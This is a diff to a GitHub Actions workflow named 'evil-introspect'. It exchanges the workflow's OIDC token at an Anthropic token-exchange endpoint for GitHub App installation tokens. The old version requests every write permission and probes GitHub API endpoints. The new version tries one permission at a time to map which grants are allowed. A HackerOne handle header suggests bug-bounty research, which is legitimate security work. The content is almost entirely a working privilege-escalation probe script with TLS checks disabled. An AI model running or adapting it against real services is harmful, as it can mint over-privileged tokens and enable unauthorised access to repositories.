@@ -1,4 +1,4 @@
-name: evil-introspect
+name: evil-introspect-bisect
 
 on:
   workflow_call:
@@ -11,27 +11,20 @@ jobs:
   exchange:
     runs-on: ubuntu-latest
     steps:
-      - name: Introspect install token's actual permission grants
+      - name: Bisect permission grants
         run: |
           set +e
           AUD="claude-code-github-action"
           URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
           TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
           echo "::add-mask::$TOK"
-          # Mint install token with ALL permissions requested; GitHub will cap to actual grant.
-          curl -sk -o /tmp/r.json -w 'EXCHANGE_HTTP %{http_code}\n' \
-            -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
-            -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
-            -d '{"permissions":{"contents":"write","workflows":"write","actions":"write","pull_requests":"write","issues":"write","metadata":"read","checks":"write","statuses":"write","discussions":"write"}}'
-          INSTALL=$(jq -r '.token // empty' /tmp/r.json)
-          echo "::add-mask::$INSTALL"
-          jq -c 'if .token then {token:"<MASKED>", expires_at} else . end' /tmp/r.json
-
-          # Many endpoints expose the installation's effective permission set
-          echo "--- /installation/repositories headers"
-          curl -sk -D - -H "Authorization: Bearer $INSTALL" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/installation/repositories?per_page=1" -o /dev/null | grep -iE "x-accepted|x-github-permissions|x-oauth-scopes|x-ratelimit|x-github-media|x-github-request|x-github-api-version"
-
-          # Try the user app installations (won't work but informative)
-          echo "--- attempt /user/installations (will 403 without user-auth)"
-          curl -sk -H "Authorization: Bearer $INSTALL" "https://api.github.com/user/installations" -w '\nHTTP %{http_code}\n' | head -3
+          for kind in metadata checks statuses discussions actions:write actions:read checks:read checks:write statuses:read security_events:write security_events:read members:read members:write deployments:read pull_requests:read issues:read; do
+            P="$(echo $kind | grep -q ':' && echo \"$kind\" | awk -F: '{print "\""$1"\":\""$2"\""}' || echo "\"$kind\":\"write\"")"
+            BODY="{\"permissions\":{\"contents\":\"write\",$P}}"
+            HTTP=$(curl -sk -o /tmp/r.json -w '%{http_code}' \
+              -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
+              -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
+              -d "$BODY")
+            R=$(jq -c 'if .token then {ok:true} else {ok:false, code:.error.details.error_code} end' /tmp/r.json)
+            echo "BISECT: kind=$kind body=$BODY http=$HTTP resp=$R"
+          done
